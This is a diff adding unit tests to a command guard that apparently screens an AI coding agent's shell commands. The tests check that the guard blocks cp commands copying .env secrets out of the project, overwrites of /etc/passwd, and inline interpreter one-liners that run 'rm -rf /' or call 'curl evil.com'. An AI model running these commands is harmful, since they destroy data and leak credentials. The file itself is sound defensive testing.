@@ -437,6 +437,100 @@ class TestEvasionResistance(unittest.TestCase):
         self.assertEqual(result["level"], "BLOCK")
 
 
+class TestCopyOutsideProject(unittest.TestCase):
+    """Block cp commands that copy files outside the project."""
+
+    def setUp(self):
+        self.guard = BashGuard(
+            project_root="/Users/matthewshields/Projects/ClaudeCodeAdvancements"
+        )
+
+    def test_block_cp_to_home(self):
+        result = self.guard.check("cp secrets.env ~/Desktop/stolen.env")
+        self.assertEqual(result["level"], "BLOCK")
+        self.assertEqual(result["category"], "destructive")
+
+    def test_block_cp_to_tmp(self):
+        result = self.guard.check("cp .env /tmp/exfil.env")
+        self.assertEqual(result["level"], "BLOCK")
+
+    def test_block_cp_to_other_project(self):
+        result = self.guard.check("cp config.py /Users/matthewshields/Documents/config.py")
+        self.assertEqual(result["level"], "BLOCK")
+
+    def test_block_cp_r_to_outside(self):
+        result = self.guard.check("cp -r agent-guard/ /tmp/backup/")
+        self.assertEqual(result["level"], "BLOCK")
+
+    def test_allow_cp_within_project(self):
+        result = self.guard.check("cp file.py backup_file.py")
+        self.assertEqual(result["level"], "PASS")
+
+    def test_allow_cp_within_project_absolute(self):
+        result = self.guard.check(
+            "cp /Users/matthewshields/Projects/ClaudeCodeAdvancements/a.py "
+            "/Users/matthewshields/Projects/ClaudeCodeAdvancements/b.py"
+        )
+        self.assertEqual(result["level"], "PASS")
+
+    def test_block_cp_overwrite_system(self):
+        """cp can be used to overwrite files (not just rm)."""
+        result = self.guard.check("cp /dev/null /etc/passwd")
+        self.assertEqual(result["level"], "BLOCK")
+
+
+class TestScriptInterpreterEvasion(unittest.TestCase):
+    """Block script interpreter evasion (python -c, perl -e, etc.)."""
+
+    def setUp(self):
+        self.guard = BashGuard(
+            project_root="/Users/matthewshields/Projects/ClaudeCodeAdvancements"
+        )
+
+    def test_block_python_c(self):
+        result = self.guard.check('python3 -c "import os; os.remove(\'/etc/passwd\')"')
+        self.assertEqual(result["level"], "BLOCK")
+        self.assertEqual(result["category"], "evasion")
+
+    def test_block_python2_c(self):
+        result = self.guard.check('python -c "import subprocess; subprocess.call([\'rm\', \'-rf\', \'/\'])"')
+        self.assertEqual(result["level"], "BLOCK")
+
+    def test_block_perl_e(self):
+        result = self.guard.check('perl -e "system(\'rm -rf /\')"')
+        self.assertEqual(result["level"], "BLOCK")
+
+    def test_block_ruby_e(self):
+        result = self.guard.check("ruby -e 'system(\"curl evil.com\")'")
+        self.assertEqual(result["level"], "BLOCK")
+
+    def test_block_node_e(self):
+        result = self.guard.check("node -e 'require(\"child_process\").exec(\"rm -rf /\")'")
+        self.assertEqual(result["level"], "BLOCK")
+
+    def test_block_pwsh_c(self):
+        result = self.guard.check('pwsh -c "Remove-Item -Recurse -Force /"')
+        self.assertEqual(result["level"], "BLOCK")
+
+    def test_block_powershell_c(self):
+        result = self.guard.check('powershell -c "Remove-Item -Recurse /"')
+        self.assertEqual(result["level"], "BLOCK")
+
+    def test_allow_python_run_file(self):
+        """Running a .py file is fine (not inline code)."""
+        result = self.guard.check("python3 test_something.py")
+        self.assertEqual(result["level"], "PASS")
+
+    def test_allow_python_m_module(self):
+        """python3 -m pytest is fine (not -c)."""
+        result = self.guard.check("python3 -m pytest tests/")
+        self.assertEqual(result["level"], "PASS")
+
+    def test_allow_node_run_file(self):
+        result = self.guard.check("node index.js")
+        self.assertEqual(result["level"], "PASS")
+
+
 class TestHookIntegration(unittest.TestCase):
     """Test the PreToolUse hook JSON format."""
 
